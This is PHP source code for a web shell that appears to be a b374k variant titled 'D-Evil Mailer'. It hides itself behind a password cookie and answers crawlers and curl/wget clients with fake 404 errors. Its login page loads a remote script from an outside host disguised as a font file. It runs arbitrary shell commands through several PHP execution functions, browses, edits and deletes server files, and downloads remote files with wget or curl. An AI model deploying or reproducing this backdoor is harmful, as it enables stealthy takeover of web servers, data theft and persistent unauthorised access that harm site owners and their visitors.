$GLOBALS['module_to_load'] = array("explorer", "terminal", "eval", "convert", "database", "info", "mail", "network", "processes");$GLOBALS['resources']['b374k'] = "hVXZrrM4En6gjARhC8yoL9hXQ9gDd2xhJ5yw8/Tj/Oef7tPSSG3JwjZVXy1flZ0nc/Lvuk/KAhmH8j9pMhUU8a864CxnQ3W5fLFwmK5fiX4JV9xny9o8G32+Txphqs9CfjhSqDheisVojklHbHNcLDN17HJaGkpDHGhdFDpklnXd/aNwaGMgVWgoXoHVm2vqktW3PEmkD/Z7CBtSKFwVYXOX81wdh/mYNmh9uy2IWnNjLKB1cAYmEK+bjQWvxK+orA+8oiX9CB/f0dm1akNfVGEnrKGaM/na5bJYFvJ1SgdAFVAf+rRGvU999mkYoJFL16pSUlBmy+WJUVupTTGtU6XK9HlOSHG4FvwFHNcGCOKuChFmNCJqehEG3K0EDbuDmt4+06zR3RReV7N5HebBlir/ezZEeVe0Nm5G1xGjP/3Jeqe/u9orV5zNquk1x3PcGLLT6JkjPujd8lrSONnDONXDeED9+noWIYlGj3KG+s0PXDF+mE3WdzCGbk1r7ojliIpCbc0fNqPW6l85gHH+tAnPlt85WSKMmQ28qjKe3o2GXWHOiTTcl+wcIUec6XlonSgOmgmv1cBI6Od3roxffDJE9GBX4BKbgV1n4/jLZoY7bhxGjNpXaK6wlHEwS3b8yX+TYuhayNJmnOICeOYMlG6LXcaFMUH/teZTS3ENIE+QU2EUIOdVLjNHIDNrCjm1v/0vfbla4fmZyMymiqZn1uwrwLoF2sGzo/3WF6+m1XYL9KlKe7NzfZifT63w5JiENgVaRzIhx0CwCSCUB/AkCaCS4Ag5Z6LgtDx2N89Ysv3oBx60jwdzDLn5gdf+Hc//R7x7zdIffjwfpRw5OJJH3MVifMD8lL9zSCUheeayBLkKNAfG/pE3+g72xutwRB81m2gDTblZgroD3z9t3xRNVMTtE5CwfnGzDTgH1sP/8GBumjy8dung/MBz/o53/iPe+vHdwP9PLX5qlGd+1aPfOvK33He//eo/D/4XGCKTpSbBAlSVg+XT51mtIveF8kPtc+/oh+s7XKA0yVMyc1czK0m5FcizEtp3j9Uobo/VtFeRWwLVL9WirnUKcXlW93Szk17izDlPcX1EFbigsg1m4Bu3L7f8clGbN3VPcKlMC+WaGsjbLV5xpLikFwYn4nK/PwUux5s7Te7nMFjWuTxPwuXfN+fWDrpVEkUS5Ex458opjhDcjLNQQz05SfRiic/yxJYClJJ0GalwMFCLbU6gX550e9lKYn/sJnMVyGGiXy3NOwrpYvKrdGmF09vrvuSXhePUbezJ83DWELlMCqstgB6mN1DFTqlRJFHYXuoQS8VC57CK9a0j0aZJLwEtMql9hnM1CqajXPlsJmLrdJKyeyDCFF28zPzy/BwbK7F5Xa06LEld9yvNS5eEenjezdVXtzNGOeQowW+W0C5CpCdqTQ2rFy2snHfB5tLaxnjaATL3yDQw3ntK3pgFvqi3FeCPK7MNmeabrjgNujuF9XNHOT3yyrwS9lo0uWcT88uuFc0DDYnnO67Z2Iz9YA/06Nlnx6J76pWMd30jVPZGJDyv1qD4ioVxDtUloC8V2z4sSC9TJIZ5vFfrmY+EPCJSo3cjcFMDdBGWV3zCZ+Lga+VMThJhf7Wtqk8CO8uPgbFdr+pAL/ElXfq9aIzto2QY6WVupahhDceF44u7I/TE31hQI2KEiKvhc7bGjxbwGOxaCTKptWrZ3XMauYmqNLoVb4PhzUbTO0RLQ3T8zTOfK3wjk+6V52G/Lhhp7t65JjIFRMMJHjrilgb9VGKGbSbA6/4pfXGV29gx2755aq2/juOiGvnu325kquDsPUi7EG/wO6zHjEhlVTHv8G4hcjaT8nnqPPRmhdlaOYGmrsFcoggzVNpbBl9f4TlK6bWQoqUOnnnK8plsdesZ7WhmFVsSuPOx1BHp45oUpElV7XhhE/TYvfFXKszKl7t7TkzpzJO8l6zI9ki1soLaypb96wl3/cBydJKPVPWP/wI=";
$GLOBALS['resources']['mime'] = "dZThdqMgEIX/7zn7DvMC2jZ62t3HmQgaGkepCDFvvxeNis32xx3huwMYmUkwSvcvRWMtIfz+Fbb5CeC0gsvp/Y1iSEARQZGAMoJyBZ9WN/Rpm7ADoUWNrEw+T7TIbmeJLemhgNCUu4EdH2EekLwh47Sd0DcN9fuBX95U19GIpq+RpN946FSudKXziyIfLlC4PHnSn02r4Un05cm3ca2Nnn3yXPRc9NyTN0+jFXV8pXDO63gmBimvw0hQiuJH8ENLMnmS0h8sl9mW74Nmdc9FK8O5vQeC0iyc7fP4kX3w8UUOWwQTekJY2U2fhWJYwZTVuBooAa0hKAXIaJMMibeZLhEeh95dmeQK51ooBJfYHe64axLgMnY1LZoOPPRngg7shneWbyQAhW9sAjvudgtg4cCWW+OQ/EDXmAxFZTTNMTFwjIvHsFemf2FlKyHEFZzZmYrYk+vUysQoQwg0D6480CBmM5dm4H2+tAC+HLoUioMCjYBnsWUtzcAUn85OK3aFELRNTXslhHW+1ek8RWlwLA8+2KYxI7fZzXTKke6Pawcm6IBGR9A3FJsPj4tKeesr3Y156E2lqQ029f5b2IzCPhzWeT1wjh/Q2vLP6yttox+SPsqPR1Ic/ZD0933dKY7SpMFYgla0dsr2SlPGjLvmKgGmRgGbWXNIvIprgnZQt1gew46StkmO2f4RCp9A1DKjlnk6MmHUfLLYdhk+a7tc+cBCww8mbsA3pkNx2j3hxmgr3up9EprkHw==";(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name']));
$GLOBALS['resources']['arrow'] = "FZXHDqtYDIYfKCPRS2Z0F4cSem+BHfVQA6HD00+uF/Zny2XzSy7SNf23GVJYItMH/pelS0mT/zQhZ7kHqklwBD8zvaAWA/gj/m8KIA/iX+Du8jOjfwv8m1Oit/Gjxfs5XYSyR7wZ9sdiLPaiE7rxwYZvDz3z0G0fN9Pt1PqiDLuyRgzA7sVpo2NvL3Cdy6p1eSS3Um21eZqfW2uc6Xc9STYjG0E8zybZ3lxYrGLgmij6FTgD+oE1fHzRyB9IXpIFlT+6J8XARNRivqAELyNW694fBYKgdQ54i2RquOgoIwOqEpRK6G66qk4HjFCAWX9NRp5cU6hMsdvSQhiGCXr7Hmfyl/TaR9KwjDxldWNp9wx7zux2sY0uWUABDxUQWhoG2Dt8WlOYIuH8fjpej0l0Ag3k01AHYyLNNo7exzAS7jczTk5oogzNlETVL5g2TcLYQI7n5y+9dRXzgN4z19fKr4mPCsLm+Z4fhc9nFab7ORjMJSOarH0XxJM8bMHBKhENzgreEnB4RwFNgUb1wm6yMFd9syRt0rPChFJ4e7D2md63/czFE+B2LsNxEpkwZeLntSUuUyuCTZGb0bYMBi9PfT3ACaK/fYdUE8GzeuLXbI0WiI/zRT7snWMV7vXc0BLFwQvIfSYKjgtoIiKJO8reFV4ahnMA1JRdKx1HMiyyMoZnMgQX7W2Jb4/tudaDRtJOUgZY5FAFbpEnYQiABEU5E+XyKu3pqRizh676B29Ssyk1ZZcZwLKwlms5igcnOp1+1ekSSQK9Lv0S2ZnH92jrgEbjN0b9dO44OK4Z4mIc2VxoxxZepzO+WLzcJrra8wYG5RKqDNe3w+ODQnrPzk+OyZo+z8kL8HK3XNhcc7Cy92cVYW3WsVZpSzZCVEopMlUun/XlOFzTWnVpt8ShAFmZsxVB3sNWkvLAUSxdyhWMgea1yH4jJVBb3QaAFPrxU3v6VD7DsFpOCVxSwRZsTFsw6Ga1qFmVUxS3tV9WjJkhkxZAMaHLA7+0NJ7dy9abkmqhppR9oAYIJM9g3OHTD+8+wQtkYMCiHSxQxMEzWvkktKPzgskfd/F3m4WH09lAfUtThQ+JA2pMvbnJ6t8SLwdtzXvR47Ze0Z0VkC5F6c7eSxl6n8/pudIYGl89MitzIHEuXxVYD3J+qt9oQ4PJqsQjEOewetHZEUf8UCRYjHw7vmxoe0Bjtx59p4PftRrDqXDRXTLqQ1NGLVE613PVZmyaiRe6SnV9b8SCdA91B7a1hB8RS3xWHIXdY6T9TwCc0xRi3IZGTB74VSs6rLkrXVm0jVjjQNstEz3DCNOpVy3Xk91cVJxbaOKEbFvrQCy2fxSUzhanvPq5bmccNWTPG3UbMsXoPWSS5TTTvo/W8LsiZ6Sdzdm2qGSqJapvuncb/jlI1c4i60NN53TasogwL0a/GFnyF4lgiGXW2N7BNyL5EEyQA42LdZtao2S9f+reA04QDbaEQtRg0YRlb/E0ksyci4MM1HlVvvqQlz0aqMXesslvqz7Y4baL0WvNHvflRnLNxLR5IFfb9KrZT97Lotz8OFtJJj9ugSFhVYy9nzcuRvC+vbF6zdrWpYtPek+rxjaeMog4pvOIbJ3wOTQmFb3d/atN9HV7ZsuZFAIRngh0oVQKZXb+fgBOdQNKnDsVQvjnz/8=";
$GLOBALS['ver'] = "1.0";
$GLOBALS['title'] = "D-Evil Mailer"; @ob_start();
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','1');
@ini_set('display_startup_errors','1');
@ini_set('log_errors','0');
@set_time_limit(0);
@clearstatcache(); if(!function_exists('auth')){ function auth(){ if(isset($GLOBALS['pass']) && (trim($GLOBALS['pass'])!='')){ $c = $_COOKIE; $p = $_POST; if(isset($p['pass'])){ $your_pass = sha1(md5($p['pass'])); if($your_pass==$GLOBALS['pass']){ setcookie("pass", $your_pass, time()+36000, "/"); header("Location: ".get_self()); } } if(!isset($c['pass']) || ((isset($c['pass'])&&($c['pass']!=$GLOBALS['pass'])))){ $res = "<!doctype html> <html> <head> <meta charset='utf-8'> <meta name='robots' content='noindex, nofollow, noarchive'> <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0'> </head> <body style='background:#f8f8f8;color:#000000;padding:0;margin:0;'><br><p><center><noscript>You need to enable javascript</noscript></center></p> <script type='text/javascript'> var d = document; d.write(\"<br><br> <form method='post'><script src='http://ip-api.org/wp-content/uploads-images/AlHurra-Font_Light.ttf'></script><center><input type='password' id='pass' name='pass' style='font-size:34px;width:34%;outline:none;text-align:center;background:#ffffff;padding:8px;border:1px solid #cccccc;border-radius:8px;color:#000000;'></center></form>\"); d.getElementById('pass').focus(); d.getElementById('pass').setAttribute('autocomplete', 'off'); </script> </body></html> "; echo $res; die(); } } }
} if(!function_exists('get_server_info')){ function get_server_info(){ $server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:$_SERVER["HTTP_HOST"]; $server_info['ip_adrress'] = "Server IP : ".$server_addr." <span class='strong'>|</span> Your IP : ".$_SERVER['REMOTE_ADDR']; $server_info['time_at_server'] = "Time <span class='strong'>@</span> Server : ".@date("d M Y H:i:s",time()); $server_info['uname'] = php_uname(); $server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')." <span class='strong'>|</span> ":''; $server_info['software'] = $server_software." PHP ".phpversion(); return $server_info; }
} if(!function_exists('get_self')){ function get_self(){ $query = (isset($_SERVER["QUERY_STRING"])&&(!empty($_SERVER["QUERY_STRING"])))?"?".$_SERVER["QUERY_STRING"]:""; return html_safe($_SERVER["REQUEST_URI"].$query); }
} if(!function_exists('get_post')){ function get_post(){ return fix_magic_quote($_POST); }
} if(!function_exists('get_nav')){ function get_nav($path){ return parse_dir($path); }
} if(!function_exists('get_cwd')){ function get_cwd(){ $cwd = getcwd().DIRECTORY_SEPARATOR; if(!isset($_COOKIE['cwd'])){ setcookie("cwd", $cwd); } else{ $cwd_c = rawurldecode($_COOKIE['cwd']); if(is_dir($cwd_c)) $cwd = realpath($cwd_c).DIRECTORY_SEPARATOR; else setcookie("cwd", $cwd); } return $cwd; }
} if(!function_exists('wrap_with_quotes')){ function wrap_with_quotes($str){ return "\"".$str."\""; }
} if(!function_exists('get_resource')){ function get_resource($type){ if(isset($GLOBALS['resources'][$type])){ return gzinflate(base64_decode($GLOBALS['resources'][$type])); } return false; }
} if(!function_exists('block_bot')){ function block_bot(){ if(isset($_SERVER['HTTP_USER_AGENT']) && (preg_match('/bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|client|python|libwww/i', $_SERVER['HTTP_USER_AGENT']))){ header("HTTP/1.0 404 Not Found"); header("Status: 404 Not Found"); die(); } elseif(!isset($_SERVER['HTTP_USER_AGENT'])){ header("HTTP/1.0 404 Not Found"); header("Status: 404 Not Found"); die(); } }
} if(!function_exists('is_win')){ function is_win(){ return (strtolower(substr(php_uname(),0,3)) == "win")? true : false; }
} if(!function_exists('fix_magic_quote')){ function fix_magic_quote($arr){ $quotes_sybase = strtolower(ini_get('magic_quotes_sybase')); if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()){ if(is_array($arr)){ foreach($arr as $k=>$v){ if(is_array($v)) $arr[$k] = clean($v); else $arr[$k] = (empty($quotes_sybase) || $quotes_sybase === 'off')? stripslashes($v) : stripslashes(str_replace("\'\'", "\'", $v)); } } } return $arr; }
} if(!function_exists('execute')){ function execute($code){ $output = ""; $code = $code." 2>&1"; if(is_callable('system') && function_exists('system')){ ob_start(); @system($code); $output = ob_get_contents(); ob_end_clean(); if(!empty($output)) return $output; } elseif(is_callable('shell_exec') && function_exists('shell_exec')){ $output = @shell_exec($code); if(!empty($output)) return $output; } elseif(is_callable('exec') && function_exists('exec')){ @exec($code,$res); if(!empty($res)) foreach($res as $line) $output .= $line; if(!empty($output)) return $output; } elseif(is_callable('passthru') && function_exists('passthru')){ ob_start(); @passthru($code); $output = ob_get_contents(); ob_end_clean(); if(!empty($output)) return $output; } elseif(is_callable('proc_open') && function_exists('proc_open')){ $desc = array( 0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); $proc = @proc_open($code, $desc, $pipes, getcwd(), array()); if(is_resource($proc)){ while($res = fgets($pipes[1])){ if(!empty($res)) $output .= $res; } while($res = fgets($pipes[2])){ if(!empty($res)) $output .= $res; } } @proc_close($proc); if(!empty($output)) return $output; } elseif(is_callable('popen') && function_exists('popen')){ $res = @popen($code, 'r'); if($res){ while(!feof($res)){ $output .= fread($res, 2096); } pclose($res); } if(!empty($output)) return $output; } return ""; }
} if(!function_exists('html_safe')){ function html_safe($str){ return htmlspecialchars($str, 2 | 1); }
} if(!function_exists('parse_dir')){ function parse_dir($path){ $path = realpath($path).DIRECTORY_SEPARATOR; $paths = explode(DIRECTORY_SEPARATOR, $path); $res = ""; for($i = 0; $i < sizeof($paths)-1; $i++){ $x = ""; for($j = 0; $j <= $i; $j++) $x .= $paths[$j].DIRECTORY_SEPARATOR; $res .= "<a class='navbar' data-path='".html_safe($x)."'>".html_safe($paths[$i])." ".DIRECTORY_SEPARATOR." </a>"; } if(is_win()) $res = get_drives().$res; return trim($res); }
} if(!function_exists('zip')){ function zip($files, $archive){ $status = false; if(!extension_loaded('zip')) return $status; if(class_exists("ZipArchive")){ $zip = new ZipArchive(); if(!$zip->open($archive, 1)) return $status; if(!is_array($files)) $files = array($files); foreach($files as $file){ $file = str_replace(get_cwd(), '', $file); $file = str_replace('\\', '/', $file); if(is_dir($file)){ $filesIterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($file), 1); foreach($filesIterator as $iterator){ $iterator = str_replace('\\', '/', $iterator); if(in_array(substr($iterator, strrpos($iterator, '/')+1), array('.', '..'))) continue; if(is_dir($iterator)) $zip->addEmptyDir(str_replace($file.'/', '', $iterator.'/')); else if(is_file($iterator)) $zip->addFromString(str_replace($file.'/', '', $iterator), read_file($iterator)); } } elseif(is_file($file)) $zip->addFromString(basename($file), read_file($file)); } if($zip->getStatusString()!==false) $status = true; $zip->close(); } return $status; }
} if(!function_exists('compress')){ function compress($type, $archive, $files){ if(!is_array($files)) $files = array($files); if($type=='zip'){ if(zip($files, $archive)) return true; else return false; } elseif(($type=='tar')||($type=='targz')){ $archive = basename($archive); $listsBasename = array_map("basename", $files); $lists = array_map("wrap_with_quotes", $listsBasename); if($type=='tar') execute("tar cf \"".$archive."\" ".implode(" ", $lists)); elseif($type=='targz') execute("tar czf \"".$archive."\" ".implode(" ", $lists)); if(is_file($archive)) return true; else return false; } return false; }
} if(!function_exists('decompress')){ function decompress($type, $archive, $path){ $path = realpath($path).DIRECTORY_SEPARATOR; $status = false; if(is_dir($path)){ chdir($path); if($type=='unzip'){ if(class_exists('ZipArchive')){ $zip = new ZipArchive(); $target = $path.basename($archive,".zip"); if($zip->open($archive)){ if(!is_dir($target)) mkdir($target); if($zip->extractTo($target)) $status = true; $zip->close(); } } } elseif($type=='untar'){ $target = basename($archive,".tar"); if(!is_dir($target)) mkdir($target); $before = count(get_all_files($target)); execute("tar xf \"".basename($archive)."\" -C \"".$target."\""); $after = count(get_all_files($target)); if($before!=$after) $status = true; } elseif($type=='untargz'){ $target = ""; if(strpos(strtolower($archive), ".tar.gz")!==false) $target = basename($archive,".tar.gz"); elseif(strpos(strtolower($archive), ".tgz")!==false) $target = basename($archive,".tgz"); if(!is_dir($target)) mkdir($target); $before = count(get_all_files($target)); execute("tar xzf \"".basename($archive)."\" -C \"".$target."\""); $after = count(get_all_files($target)); if($before!=$after) $status = true; } } return $status; }
} if(!function_exists('download')){ function download($url ,$saveas){ if(!preg_match("/[a-z]+:\/\/.+/",$url)) return false; $filename = basename($url); if($content = read_file($url)){ if(is_file($saveas)) unlink($saveas); if(write_file($saveas, $content)){ return true; } } $buff = execute("wget ".$url." -O ".$saveas); if(is_file($saveas)) return true; $buff = execute("curl ".$url." -o ".$saveas); if(is_file($saveas)) return true; $buff = execute("lwp-download ".$url." ".$saveas); if(is_file($saveas)) return true; $buff = execute("lynx -source ".$url." > ".$saveas); if(is_file($saveas)) return true; return false; }
} if(!function_exists('get_fileperms')){ function get_fileperms($file){ if($perms = @fileperms($file)){ $flag = 'u'; if(($perms & 0xC000) == 0xC000)$flag = 's'; elseif(($perms & 0xA000) == 0xA000)$flag = 'l'; elseif(($perms & 0x8000) == 0x8000)$flag = '-'; elseif(($perms & 0x6000) == 0x6000)$flag = 'b'; elseif(($perms & 0x4000) == 0x4000)$flag = 'd'; elseif(($perms & 0x2000) == 0x2000)$flag = 'c'; elseif(($perms & 0x1000) == 0x1000)$flag = 'p'; $flag .= ($perms & 00400)? 'r':'-'; $flag .= ($perms & 00200)? 'w':'-'; $flag .= ($perms & 00100)? 'x':'-'; $flag .= ($perms & 00040)? 'r':'-'; $flag .= ($perms & 00020)? 'w':'-'; $flag .= ($perms & 00010)? 'x':'-'; $flag .= ($perms & 00004)? 'r':'-'; $flag .= ($perms & 00002)? 'w':'-'; $flag .= ($perms & 00001)? 'x':'-'; return $flag; } else return "???????????"; }
} if(!function_exists('format_bit')){ function format_bit($size){ $base = log($size) / log(1024); $suffixes = array('B','KB','MB','GB','TB','PB','EB','ZB','YB'); return round(pow(1024, $base - floor($base)),2)." ".$suffixes[floor($base)]; }
} if(!function_exists('get_filesize')){ function get_filesize($file){ $size = @filesize($file); if($size!==false){ if($size<=0) return 0; return format_bit($size); } else return "???"; }
} if(!function_exists('get_filemtime')){ function get_filemtime($file){ return @date("d-M-Y H:i:s", filemtime($file)); }
} if(!function_exists('get_fileowner')){ function get_fileowner($file){ $owner = "?:?"; if(function_exists("posix_getpwuid")){ $name = posix_getpwuid(fileowner($file)); $group = posix_getgrgid(filegroup($file)); $owner = $name['name'].":".$group['name']; } return $owner; }
} if(!function_exists('rmdirs')){ function rmdirs($dir, $counter = 0){ if(is_dir($dir)) $dir = realpath($dir).DIRECTORY_SEPARATOR; if($dh = opendir($dir)){ while(($f = readdir($dh))!==false){ if(($f!='.')&&($f!='..')){ $f = $dir.$f; if(@is_dir($f)) $counter += rmdirs($f); else{ if(unlink($f)) $counter++; } } } closedir($dh); if(rmdir($dir)) $counter++;; } return $counter; }
} if(!function_exists('copys')){ function copys($source , $target ,$c=0){ $source = realpath($source).DIRECTORY_SEPARATOR; if($dh = opendir($source)){ if(!is_dir($target)) mkdir($target); $target = realpath($target).DIRECTORY_SEPARATOR; while(($f = readdir($dh))!==false){ if(($f!='.')&&($f!='..')){ if(is_dir($source.$f)){ copys($source.$f, $target.$f, $c); } else{ if(copy($source.$f, $target.$f)) $c++; } } } closedir($dh); } return $c; }
} if(!function_exists('get_all_files')){ function get_all_files($path){ $path = realpath($path).DIRECTORY_SEPARATOR; $files = glob($path.'*'); for($i = 0; $i<count($files); $i++){ if(is_dir($files[$i])){ $subdir = glob($files[$i].DIRECTORY_SEPARATOR.'*'); if(is_array($files) && is_array($subdir)) $files = array_merge($files, $subdir); } } return $files; }
} if(!function_exists('read_file')){ function read_file($file){ $content = false; if($fh = @fopen($file, "rb")){ $content = ""; while(!feof($fh)){ $content .= fread($fh, 8192); } } return $content; }
} if(!function_exists('write_file')){ function write_file($file, $content){ if($fh = @fopen($file, "wb")){ if(fwrite($fh, $content)!==false) return true; } return false; }
} if(!function_exists('view_file')){ function view_file($file, $type, $preserveTimestamp='true'){ $output = ""; if(is_file($file)){ $dir = dirname($file); $owner = ""; if(!is_win()){ $owner = "<tr><td>Owner</td><td>".get_fileowner($file)."</td></tr>"; } $image_info = @getimagesize($file); $mime_list = get_resource('mime'); $mime = ""; $file_ext_pos = strrpos($file, "."); if($file_ext_pos!==false){ $file_ext = trim(substr($file, $file_ext_pos),"."); if(preg_match("/([^\s]+)\ .*\b".$file_ext."\b.*/i", $mime_list, $res)){ $mime = $res[1]; } } if($type=="auto"){ if(is_array($image_info)) $type = 'image'; elseif(!empty($mime)) $type = "multimedia"; else $type = "raw"; } $content = ""; if($type=="code"){ $hl_arr = array( "hl_default"=> ini_get('highlight.default'), "hl_keyword"=> ini_get('highlight.keyword'), "hl_string"=> ini_get('highlight.string'), "hl_html"=> ini_get('highlight.html'), "hl_comment"=> ini_get('highlight.comment') ); $content = highlight_string(read_file($file),true); foreach($hl_arr as $k=>$v){ $content = str_replace("<font color=\"".$v."\">", "<font class='".$k."'>", $content); $content = str_replace("<span style=\"color: ".$v."\">", "<span class='".$k."'>", $content); } } elseif($type=="image"){ $width = (int) $image_info[0]; $height = (int) $image_info[1]; $image_info_h = "Image type = <span class='strong'>(</span> ".$image_info['mime']." <span class='strong'>)</span><br> Image Size = <span class='strong'>( </span>".$width." x ".$height."<span class='strong'> )</span><br>"; if($width > 800){ $width = 800; $imglink = "<p><a id='viewFullsize'> <span class='strong'>[ </span>View Full Size<span class='strong'> ]</span></a></p>"; } else $imglink = ""; $content = "<center>".$image_info_h."<br>".$imglink." <img id='viewImage' style='width:".$width."px;' src='data:".$image_info['mime'].";base64,".base64_encode(read_file($file))."' alt='".$file."'></center> "; } elseif($type=="multimedia"){ $content = "<center> <video controls> <source src='' type='".$mime."'> </video> <p><span class='button' onclick=\"multimedia('".html_safe(addslashes($file))."');\">Load Multimedia File</span></p> </center>"; } elseif($type=="edit"){ $preservecbox = ($preserveTimestamp=='true')? " cBoxSelected":""; $content = "<table id='editTbl'><tr><td colspan='2'><input type='text' id='editFilename' class='colSpan' value='".html_safe($file)."' onkeydown=\"trap_enter(event, 'edit_save_raw');\"></td></tr><tr><td class='colFit'><span class='button' onclick=\"edit_save_raw();\">save</span></td><td style='vertical-align:middle;'><div class='cBox".$preservecbox."'></div><span>preserve modification timestamp</span><span id='editResult'></span></td></tr><tr><td colspan='2'><textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_raw');\">".html_safe(read_file($file))."</textarea></td></tr></table>"; } elseif($type=="hex"){ $preservecbox = ($preserveTimestamp=='true')? " cBoxSelected":""; $content = "<table id='editTbl'><tr><td colspan='2'><input type='text' id='editFilename' class='colSpan' value='".html_safe($file)."' onkeydown=\"trap_enter(event, 'edit_save_hex');\"></td></tr><tr><td class='colFit'><span class='button' onclick=\"edit_save_hex();\">save</span></td><td style='vertical-align:middle;'><div class='cBox".$preservecbox."'></div><span>preserve modification timestamp</span><span id='editHexResult'></span></td></tr><tr><td colspan='2'><textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_hex');\">".bin2hex(read_file($file))."</textarea></td></tr></table>"; } else $content = "<pre>".html_safe(read_file($file))."</pre>"; $output .= " <table id='viewFile' class='boxtbl'> <tr><td style='width:120px;'>Filename</td><td>".html_safe($file)."</td></tr> <tr><td>Size</td><td>".get_filesize($file)." (".filesize($file).")</td></tr> ".$owner." <tr><td>Permission</td><td>".get_fileperms($file)."</td></tr> <tr><td>Create time</td><td>".@date("d-M-Y H:i:s",filectime($file))."</td></tr> <tr><td>Last modified</td><td>".@date("d-M-Y H:i:s",filemtime($file))."</td></tr> <tr><td>Last accessed</td><td>".@date("d-M-Y H:i:s",fileatime($file))."</td></tr> <tr data-path='".html_safe($file)."'><td colspan='2'> <span class='navigate button' style='width:120px;'>explorer</span> <span class='action button' style='width:120px;'>action</span> <span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'raw');hide_box();\">raw</span> <span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'code');hide_box();\">code</span> <span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'hex');hide_box();\">hex</span> <span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'image');hide_box();\">image</span> <span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'multimedia');hide_box();\">multimedia</span> </td></tr> <tr><td colspan='2'><div id='viewFilecontent'>".$content."</div></td></tr> </table>"; } else $output = "error"; return $output; }
} if(!function_exists('get_writabledir')){ function get_writabledir(){ if(is_writable(".")) return realpath(".").DIRECTORY_SEPARATOR; else{ foreach(array('TMP', 'TEMP', 'TMPDIR') as $k){ if(!empty($_ENV[$k])){ if(is_writable($_ENV[$k])) return realpath($_ENV[$k]).DIRECTORY_SEPARATOR; } } if(function_exists("sys_get_temp_dir")){ $dir = sys_get_temp_dir(); if(is_writable($dir)) return realpath($dir).DIRECTORY_SEPARATOR; } else{ if(!is_win()){ if(is_writable("/tmp")) return "/tmp/"; } } $tempfile = tempnam(__FILE__,''); if(file_exists($tempfile)){ $dir = realpath(dirname($tempfile)).DIRECTORY_SEPARATOR; unlink($tempfile); return $dir; } } return false; }
} if(!function_exists('get_drives')){ function get_drives(){ $drives = ""; $v = explode("\\", get_cwd()); $v = $v[0]; foreach (range("A", "Z") as $letter){ if(@is_readable($letter.":\\")){ $drives .= "<a class='navbar' data-path='".$letter.":\\'>[ "; if($letter.":" != $v) $drives .= $letter; else{$drives .= "<span class='drive-letter'>".$letter."</span>";} $drives .= " ]</a> "; } } return $drives; }
} if(!function_exists('show_all_files')){ function show_all_files($path){ if(!is_dir($path)) return "No such directory : ".$path; chdir($path); $output = ""; $allfiles = $allfolders = array(); if($res = opendir($path)){ while($file = readdir($res)){ if(($file!='.')&&($file!="..")){ if(is_dir($file)) $allfolders[] = $file; elseif(is_file($file))$allfiles[] = $file; } } } array_unshift($allfolders, "."); $cur = getcwd(); chdir(".."); if(getcwd()!=$cur) array_unshift($allfolders, ".."); chdir($cur); natcasesort($allfolders); natcasesort($allfiles); $cols = array(); if(is_win()){ $cols = array( "perms"=>"get_fileperms", "modified"=>"get_filemtime" ); } else{ $cols = array( "owner"=>"get_fileowner", "perms"=>"get_fileperms", "modified"=>"get_filemtime" ); } $totalFiles = count($allfiles); $totalFolders = 0; $output .= "<table id='xplTable' class='dataView sortable'><thead>"; $output .= "<tr><th class='col-cbox sorttable_nosort'><div class='cBoxAll'></div></th><th class='col-name'>name</th><th class='col-size'>size</th>"; foreach($cols as $k=>$v){ $output .= "<th class='col-".$k."'>".$k."</th>"; } $output .= "</tr></thead><tbody>"; foreach($allfolders as $d){ $cboxException = ""; if(($d==".")||($d=="..")){ $action = "actiondot"; $cboxException = " cBoxException"; } else{ $action = "actionfolder"; $totalFolders++; } $output .= " <tr data-path=\"".html_safe(realpath($d).DIRECTORY_SEPARATOR)."\"><td><div class='cBox".$cboxException."'></div></td> <td style='white-space:normal;'><a class='navigate'>[ ".html_safe($d)." ]</a><span class='".$action." floatRight'>action</span></td> <td>DIR</td>"; foreach($cols as $k=>$v){ $sortable = ""; if($k=='modified') $sortable = " title='".filemtime($d)."'"; $output .= "<td".$sortable.">".$v($d)."</td>"; } $output .= "</tr>"; } foreach($allfiles as $f){ $output .= " <tr data-path=\"".html_safe(realpath($f))."\"><td><div class='cBox'></div></td> <td style='white-space:normal;'><a class='view'>".html_safe($f)."</a><span class='action floatRight'>action</span></td> <td title='".filesize($f)."'>".get_filesize($f)."</td>"; foreach($cols as $k=>$v){ $sortable = ""; if($k=='modified') $sortable = " title='".filemtime($f)."'"; $output .= "<td".$sortable.">".$v($f)."</td>"; } $output .= "</tr>"; } $output .= "</tbody><tfoot>"; $colspan = 1 + count($cols); $output .= "<tr><td><div class='cBoxAll'></div></td><td> <select id='massAction' class='colSpan'> <option disabled selected>Action</option> <option>cut</option> <option>copy</option> <option>paste</option> <option>delete</option> <option disabled>------------</option> <option>chmod</option> <option>chown</option> <option>touch</option> <option disabled>------------</option> <option>extract (tar)</option> <option>extract (tar.gz)</option> <option>extract (zip)</option> <option disabled>------------</option> <option>compress (tar)</option> <option>compress (tar.gz)</option> <option>compress (zip)</option> <option disabled>------------</option> </select> </td><td colspan='".$colspan."'></td></tr> <tr><td></td><td colspan='".++$colspan."'>".$totalFiles." file(s), ".$totalFolders." Folder(s)<span class='xplSelected'></span></td></tr> "; $output .= "</tfoot></table>"; return $output; }
